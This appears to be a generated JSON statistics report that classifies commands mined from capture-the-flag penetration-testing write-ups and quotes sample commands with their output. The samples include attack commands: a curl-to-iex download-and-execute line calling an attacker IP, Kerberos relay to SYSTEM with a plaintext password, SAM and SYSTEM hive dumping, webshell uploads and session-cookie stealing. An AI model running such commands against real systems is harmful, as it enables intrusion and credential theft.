@@ -1,0 +1,273 @@
+{
+  "generated_at": "2026-10-24T00:34:08.994Z",
+  "note": "opportunities = prose cue fired AND OBOL minted nothing; candidates for human review",
+  "axes": {
+    "enumeration": {
+      "units": 1906,
+      "withOutput": 1795,
+      "minted": 1613,
+      "proseMaterial": 0,
+      "opportunities": 0,
+      "samples": []
+    },
+    "state-change": {
+      "units": 2660,
+      "withOutput": 1686,
+      "minted": 556,
+      "proseMaterial": 781,
+      "opportunities": 507,
+      "samples": [
+        {
+          "file": "absolute.md",
+          "command": "KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb",
+          "outputHead": "Evil-WinRM shell v3.4 | Info: Establishing connection to remote endpoint",
+          "prose": "This has created a credential and given both the NT hash (which isn’t useful for me here) and saved a ticket in winrm_user.ccache . Shell I’ll use the new cred to get an evil-winrm shell: And grab user.txt :"
+        },
+        {
+          "file": "absolute.md",
+          "command": ".\\CheckPort.exe",
+          "outputHead": "[*] Looking for available ports.. | [*] SYSTEM Is allowed through port 10",
+          "prose": "Find Port CheckPort.exe will identify the port that the malicious server will run on: It identifies port 10. Identify CLSID Very similar to how many of the Potato attacks work, I’ll need a CLSID for a valid RPC service with the correct perm"
+        },
+        {
+          "file": "absolute.md",
+          "command": ".\\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 \".\\KrbRelayUp.exe relay -",
+          "outputHead": "KrbRelayUp - Relaying you to SYSTEM | [+] Rewriting function table | [+] Rewriting PEB | [+] Init COM server",
+          "prose": "Just like above, I’ll need to run it in a active session with RunasCs . It seems to work: However, running that command doesn’t work. That’s because it’s trying to spawn a shell, and something is blocking it. Success I’ll run this again and"
+        },
+        {
+          "file": "absolute.md",
+          "command": ".\\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 \".\\KrbRelayUp.exe relay -",
+          "outputHead": "KrbRelayUp - Relaying you to SYSTEM | [+] Rewriting function table | [+] Rewriting PEB | [+] Init COM server",
+          "prose": "However, running that command doesn’t work. That’s because it’s trying to spawn a shell, and something is blocking it. Success I’ll run this again and look at the output: It’s asking me to run KrbRelayUp.exe spawn with the following paramet"
+        },
+        {
+          "file": "access.md",
+          "command": "$WScript.CreateShortcut($sc)",
+          "outputHead": "FullName         : C:\\Users\\Public\\Desktop\\ZKAccess3.5 Security System.lnk | Arguments        : /user:ACCESS\\Administrator /savecred \"C:\\ZKTeco\\ZKAccess3.5\\Access.exe\" | Description      :  | Hotkey           : ",
+          "prose": "Lnk Details From PowerShell, I’ll create a WSCript shell, and load the lnk file into it: I could also do this as a one-liner without a full PowerShell:"
+        },
+        {
+          "file": "acute.md",
+          "command": "",
+          "outputHead": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" | HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths |     C:\\Utils    REG_DWORD    0x0 |     C:\\Windows\\System32    REG_DWORD   ",
+          "prose": "The registry confirms this: There are actually two, but I can’t write to C:\\Windows\\System32 as a non-privileged user. Upload and Execution I’ll upload the reverse shell again, this time into C:\\Utils :"
+        },
+        {
+          "file": "acute.md",
+          "command": "meterpreter load powershell",
+          "outputHead": "Loading extension powershell... | [-] Failed to load extension: No response was received to the core_loadlib request.",
+          "prose": "PowerShell Meterpreter has a PowerShell module that typically can load the .NET Common Language Runtime (CLR) and interact with the Windows API. It’s invoked with load powershell . For some reason, it fails here: Instead, to drop to a Power"
+        },
+        {
+          "file": "acute.md",
+          "command": "powershell",
+          "outputHead": "Windows PowerShell | Copyright (C) Microsoft Corporation. All rights reserved. | Try the new cross-platform PowerShell https://aka.ms/pscore6",
+          "prose": "Instead, to drop to a PowerShell shell, I’ll run shell (which spawns a cmd.exe process), and then powershell from there: Execution as imonk on ATSSERVER Enumeration Container / VM ipconfig shows the IP for this host is 172.16.22.2:"
+        },
+        {
+          "file": "acute.md",
+          "command": "qwinsta /server:127.0.0.1",
+          "outputHead": " SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE  |  console           edavies                   1  Active ",
+          "prose": "There’s a section that’s easy to miss, but very interesting: It’s saying there’s an RDP session. This could also be seen without WinPeas by running qwinsta /server:127.0.0.1 : I believe (please correct me if I’m getting this wrong) that it’"
+        },
+        {
+          "file": "acute.md",
+          "command": "Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -ConfigurationName dc_",
+          "outputHead": "CommandType     Name                                               Version    Source               PSComputerName       | -----------     ----                                               -------    ------              ",
+          "prose": "Shell as jmorgan on Acute-PC01 Enumeration Limited Shell To enumerate further, first I need to understand what commands I have access to in this configuration. Get-Command will tell me that: I’ll also look at Get-Alias to see what are set:"
+        },
+        {
+          "file": "acute.md",
+          "command": "reg save HKLM\\sam sam.bak",
+          "outputHead": "The operation completed successfully.",
+          "prose": "Alternatively, I could modify it to add edavies to the administrators group, and get equivalent access. Execution as awallace on ATSSERVER Get Password Dump Hives As a local administrator on Acute-PC01, jmorgan can create backups of the reg"
+        },
+        {
+          "file": "acute.md",
+          "command": "reg save HKLM\\system sys.bak",
+          "outputHead": "The operation completed successfully.",
+          "prose": "Alternatively, I could modify it to add edavies to the administrators group, and get equivalent access. Execution as awallace on ATSSERVER Get Password Dump Hives As a local administrator on Acute-PC01, jmorgan can create backups of the reg"
+        }
+      ]
+    },
+    "loot": {
+      "units": 1615,
+      "withOutput": 1339,
+      "minted": 324,
+      "proseMaterial": 663,
+      "opportunities": 534,
+      "samples": [
+        {
+          "file": "absolute.md",
+          "command": "ls",
+          "outputHead": "drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 . | drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 .. | drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 absolute.htb",
+          "prose": "I can list the shares, and connect to a share, like SYSVOL : There’s nothing interesting here. CrackMapExec With creds now, I can connect to LDAP. One thing to pull would be the list of users. crackmapexec will do this:"
+        },
+        {
+          "file": "absolute.md",
+          "command": "type user.txt",
+          "outputHead": "b3fb6413************************",
+          "prose": "And grab user.txt : Shell as administrator KrbRelay Background A very popular Kerberos-based attack for the last couple years has been KrbRelay. This technique was first discussed in a Google Project Zero post on October 2021, and then Cube"
+        },
+        {
+          "file": "absolute.md",
+          "command": "type root.txt",
+          "outputHead": "adce565c************************",
+          "prose": "And can read root.txt : KrbRelayUp Failures KrbRelayUp takes common attack paths with KrbRelay and automates them. Unfortunately, none of them quite work here. I’ll download a copy from SharpCollection and upload it to Absolute."
+        },
+        {
+          "file": "access.md",
+          "command": "type output",
+          "outputHead": "-----BEGIN CERTIFICATE----- | AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9 | ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQA | aQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZ",
+          "prose": "I’ll do the same thing for the credentials file: "
+        },
+        {
+          "file": "acute.md",
+          "command": "Invoke-Command -ScriptBlock { ls '\\program files\\keepmeon' } -ComputerName ATSSERVER -Conf",
+          "outputHead": "Access to the path 'C:\\program files\\keepmeon' is denied. |     + CategoryInfo          : PermissionDenied: (C:\\program files\\keepmeon:String) [Get-ChildItem], UnauthorizedAccess  |    Exception |     + FullyQualifiedErr",
+          "prose": "Hyper-V is likely the virtualization technology to get nested Windows hosts like this. keepmeon is not something I’m familiar with. Unfortunately, imonks is not able to access it: Desktop In addition to user.txt , there’s another file on im"
+        },
+        {
+          "file": "administrator.md",
+          "command": "cat user.txt",
+          "outputHead": "142aa43f************************",
+          "prose": "And grab the user flag: Auth as ethan Enumeration Bloodhound shows that emily has GenericWrite over ethan: Targeted Kerberoast Background A Service Principal Name (SPN) is a unique identifier that associates a service instance with a servic"
+        },
+        {
+          "file": "administrator.md",
+          "command": "cat root.txt",
+          "outputHead": "4cf2d737************************",
+          "prose": "And read the final flag: "
+        },
+        {
+          "file": "admirer.md",
+          "command": "cat user.txt",
+          "outputHead": "890e4d73************************",
+          "prose": "highlight root@kali sshpass -p '& ' ssh waldo@10.10.10.187 Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux The programs included with the Devuan GNU/Linux system are free software; the exact distribution terms for each program are described i"
+        },
+        {
+          "file": "admirer.md",
+          "command": "find / -type d -writable 2>/dev/null | grep -v -e '^/proc' -e '/run'",
+          "outputHead": "/var/lib/php/sessions | /var/tmp | /tmp | /home/waldo",
+          "prose": "I can look for writable directories: /var/tmp seems like a good option ( /home/waldo/.nano would have been good too). What If this works, root is going to run some Python code for me. My first instinct is to use a reverse shell, but that mi"
+        },
+        {
+          "file": "admirer.md",
+          "command": "cat root.txt",
+          "outputHead": "996a2609************************",
+          "prose": "Either way, grab root.txt : "
+        },
+        {
+          "file": "aero.md",
+          "command": "type user.txt",
+          "outputHead": "f3597b4c************************",
+          "prose": "The shell is as sam.emerson, and I’m able to read user.txt : Potential Bug : It is possible that sometimes the shell that comes back looks like this, with the directory of ImmersiveControlPanel :"
+        },
+        {
+          "file": "aero.md",
+          "command": "type root.txt",
+          "outputHead": "7aafc436************************",
+          "prose": "And I’m able to read root.txt : Beyond Root - watchdog.ps1 The automation script responsible for running the uploaded theme files uses a neat technology, the FileSystemWatcher (docs). It creates the object and assigns to it a Path , a Filte"
+        }
+      ]
+    },
+    "outcome": {
+      "units": 411,
+      "withOutput": 248,
+      "minted": 174,
+      "proseMaterial": 128,
+      "opportunities": 41,
+      "samples": [
+        {
+          "file": "anubis.md",
+          "command": "certutil -ca.cert",
+          "outputHead": "  Name: Active Directory Enrollment Policy |   Id: {43481048-91B1-43AA-93DF-F22262486073} |   Url: ldap: | 1 CAs:",
+          "prose": "It’s saying too many arguments. If I leave off the output name it works, but not what I was looking for: It thinks I’m trying to run the -CA sub command, not -ca.cert . I played with quotes and other formatting, but eventually tried /ca.cer"
+        },
+        {
+          "file": "anubis.md",
+          "command": "certutil /ca.cert ca.cer",
+          "outputHead": "CA cert[0]: 3 -- Valid | CA cert[0]: | -----BEGIN CERTIFICATE----- | MIIDfTCCAmWgAwIBAgIQNkWTCnXFyLpKrApciD3uYDANBgkqhkiG9w0BAQsFADBF",
+          "prose": "It thinks I’m trying to run the -CA sub command, not -ca.cert . I played with quotes and other formatting, but eventually tried /ca.cert and it worked: krb5.conf I’ll make copies of ca.cer (from certutil above), admin.cer (from certreq abov"
+        },
+        {
+          "file": "anubis.md",
+          "command": "curl http://10.10.14.6/ADCS.ps1 | iex",
+          "outputHead": "<# | .SYNOPSIS | Just a shortcut to PowerViews Get-DomainObject that retrieves Root CAs from the default location at CN=Certification  | Authorities,CN=Public Key Services,CN=Services,CN=Configuration....",
+          "prose": "ation specific to Anubis, and that is that the the UserPrincipleName on the Administrator account is messed up, set to an old domain that the box was developed on before it was changed to submit to HackTheBox. In effect, this means at this "
+        },
+        {
+          "file": "breadcrumbs.md",
+          "command": "curl http://10.10.10.228/portal/includes/fileController.php -H \"Cookie: PHPSESSID=paul4720",
+          "outputHead": "Success. Have a great weekend!oxdf@parrot$ ",
+          "prose": "Now I’ll upload the modified webshell to get around defender (and modify the filename to .php in Burp Proxy), and the site responds “Success. Have a great weekend!”. Visiting http://10.10.10.228/portal/uploads/shell.php?cmd=whoami shows I h"
+        },
+        {
+          "file": "cerberus.md",
+          "command": "curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/ici",
+          "outputHead": "[Administrators] | users = \"matthew\" | permissions = \"*\" | groups = \"Administrators\"",
+          "prose": "There is a matthew user in the /etc/passwd file, but I am not able to read anything out of /home/matthew . Read Config Files Searching for “icingaweb2 config files” finds this page of the Icingaweb2 docs on configuration. At the top, it sum"
+        },
+        {
+          "file": "cerberus.md",
+          "command": "curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/var/www",
+          "outputHead": "<?php | header(\"Location: http://icinga.cerberus.local:8080/icingaweb2\"); | ?>",
+          "prose": "RCE Write to Web Root \\[Fail\\] The question now is how to leverage this file read and file write to get execution on Cerberus. The obvious idea is to write a PHP webshell into the web root and access the file directly through there. To do t"
+        },
+        {
+          "file": "cereal.md",
+          "command": "wget 10.10.14.15/test -usebasicparsing",
+          "outputHead": "StatusCode        : 200 | StatusDescription : OK | Content           : {116, 101, 115, 116...} | RawContent        : HTTP/1.0 200 OK",
+          "prose": "Some troubleshooting shows that it looks like outbound TCP 135 is blocked. When I try to connect back on 80, it works: But if I change the webserver and the request to 135, it fails to connect:"
+        },
+        {
+          "file": "cereal.md",
+          "command": "wget 10.10.14.15:135/test -usebasicparsing",
+          "outputHead": "wget : Unable to connect to the remote server  | At line:1 char:1 | + wget 10.10.14.15:135/test -usebasicparsing | + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",
+          "prose": "But if I change the webserver and the request to 135, it fails to connect: SweetPotato / PrintSpoofer SweetPotato and PrintSpoofer get Windows to connect to them using a print job via the Print Spooler service. The problem for Cereal is tha"
+        },
+        {
+          "file": "cozyhosting.md",
+          "command": "curl -s http://cozyhosting.htb/actuator/sessions | jq .",
+          "outputHead": "{ |   \"1AB37C626597DADB7425C1273F7DA678\": \"kanderson\" | }",
+          "prose": "/addhost and /executessh , but I’ll come back to those. /actuator/env lead what looks like some configuration values, but a lot of the interesitng ones (and some not interesting ones) are masked, shown as strings of “\\ ”. /actuator/sessions"
+        },
+        {
+          "file": "cozyhosting.md",
+          "command": "curl -s http://cozyhosting.htb/actuator/sessions | jq .",
+          "outputHead": "{ |   \"EEE571008BF31ADB2E904F4E8CBF5ABB\": \"UNAUTHORIZED\", |   \"E1CE43B04CC6C958A7496877E331256D\": \"UNAUTHORIZED\", |   \"2926B07C6C6B8CB0B92A5AE5DF5AE2B6\": \"UNAUTHORIZED\",",
+          "prose": "If try and fail to log in a few times, more sessions show up: Shell as app Session Stealing I’ll go into Firefox dev tools, under Storage -\\ Cookies and replace the value for JSESSIONID with the kandersons user’s cookie. Now when I refresh "
+        },
+        {
+          "file": "dog.md",
+          "command": "curl http://10.10.11.58/core/profiles/testing/testing.info",
+          "outputHead": "name = Testing | description = Minimal profile for running tests. Includes absolutely required modules only. | version = BACKDROP_VERSION | backdrop = 1.x",
+          "prose": "This doesn’t find anything I couldn’t get through GitHub, but does help orient that the folders at the root of the repo are available on the webserver: Backdrop Version All the directories without an index.php file have listing enabled, and"
+        },
+        {
+          "file": "editorial.md",
+          "command": "curl -s 'http://editorial.htb/static/uploads/63ef32c6-91b8-4ac1-9216-000fd0a3f1a1' | jq .",
+          "outputHead": "{ |   \"template_mail_message\": \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and autho",
+          "prose": "\"Retrieve a list of all the versions and updates of the api.\", \"endpoint\": \"/api/latest/metadata/changelog\", \"methods\": \"GET\" } }, { \"latest\": { \"description\": \"Retrieve the last version of api.\", \"endpoint\": \"/api/latest/metadata\", \"method"
+        }
+      ]
+    },
+    "none": {
+      "units": 170,
+      "withOutput": 73,
+      "minted": 4,
+      "proseMaterial": 0,
+      "opportunities": 0,
+      "samples": []
+    },
+    "other": {
+      "units": 2382,
+      "withOutput": 1775,
+      "minted": 381,
+      "proseMaterial": 0,
+      "opportunities": 0,
+      "samples": []
+    }
+  }
+}
